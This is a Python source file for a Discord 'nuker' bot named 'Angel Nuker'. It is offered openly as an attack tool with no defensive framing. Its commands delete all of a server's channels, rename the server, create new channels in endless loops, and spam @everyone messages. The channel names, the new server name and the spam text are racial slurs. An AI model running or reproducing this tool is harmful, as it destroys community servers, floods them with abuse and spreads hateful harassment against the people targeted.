class nuker:
    version = 0.1

import random
import os
import ctypes
import pyfiglet
import string
import json
from colorama import Fore, init
import discord
from discord import Permissions
from discord.ext import commands, tasks
from discord.ext import *

ctypes.windll.kernel32.SetConsoleTitleW(f"[Angel Nuker v{nuker.version} | Loading...")

init(convert=True)

bio = ["!help"]
channel_names = ["ok", "dumbass niggers"]

print(f"{Fore.RED}Connecting to nuker....{Fore.RESET}")
os.system('cls')

prefix = "@"

client = commands.Bot(command_prefix=prefix)

@client.event
async def on_connect():
    ctypes.windll.kernel32.SetConsoleTitleW(f"[Angel Nuker v{nuker.version} | Logged in as {client.user}")

    print(f"""
    
                                {Fore.RED}Made by Angel.{Fore.RESET} {Fore.CYAN}Give me some credz.{Fore.RESET}
    
    {Fore.CYAN} █████╗ ███╗   ██╗ ██████╗ ███████╗██╗{Fore.RESET}         {Fore.RED}███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗{Fore.RESET} 
    {Fore.CYAN}██╔══██╗████╗  ██║██╔════╝ ██╔════╝██║{Fore.RESET}         {Fore.RED}████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗{Fore.RESET} 
    {Fore.CYAN}███████║██╔██╗ ██║██║  ███╗█████╗  ██║{Fore.RESET}         {Fore.RED}██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝{Fore.RESET}
    {Fore.CYAN}██╔══██║██║╚██╗██║██║   ██║██╔══╝  ██║{Fore.RESET}         {Fore.RED}██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗{Fore.RESET}
    {Fore.CYAN}██║  ██║██║ ╚████║╚██████╔╝███████╗███████╗{Fore.RESET}    {Fore.RED}██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║{Fore.RESET}
    {Fore.CYAN}╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝{Fore.RESET}    {Fore.RED}╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{Fore.RESET}
    
              {Fore.RED}Angel{Fore.RESET} {Fore.BLUE}Nuker{Fore.RESET} | Logged in as: {client.user} | ID: {client.user.id}

    """+Fore.RESET)


@client.event
async def on_ready():
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening, name=random.choice(bio)))


@client.command(pass_context=True)
async def nuke(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()

    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(f"{Fore.RED}{channel.name} has been deleted!{Fore.RESET}")
        except:
            pass

    for i in range(1):
        try:
            await ctx.guild.edit(name="niggers got nuked", icon=None)
            print(f"{Fore.RED} Changed name and guild icon!")
        except:
            print(f"{Fore.YELLOW}Can't change guild name or icon.{Fore.RESET}")

    for i in range(1):
        await guild.create_text_channel(random.choice(channel_names))
    while True:
        for channel in guild.text_channels:
            for i in range(500):
                await guild.create_text_channel(random.choice(channel_names))


@client.command(pass_context=True)
async def cdel(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()

    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(f"{Fore.RED}{channel.name} has been deleted!{Fore.RESET}")
        except:
            pass


@client.command(pass_context=True)
async def ccr(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()

    for i in range(1):
        await guild.create_text_channel(random.choice(channel_names))
    while True:
        for channel in guild.text_channels:
            for i in range(500):
                await guild.create_text_channel(random.choice(channel_names))


@client.command(pass_context=True)
async def spam(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    
    for i in range(2):
        print("Spammed channels!")
        while True:
            for channel in guild.text_channels:
                await channel.send('@everyone niggers')


with open('config.json') as f:
    config = json.load(f)
    token = config.get('token')

client.run(token)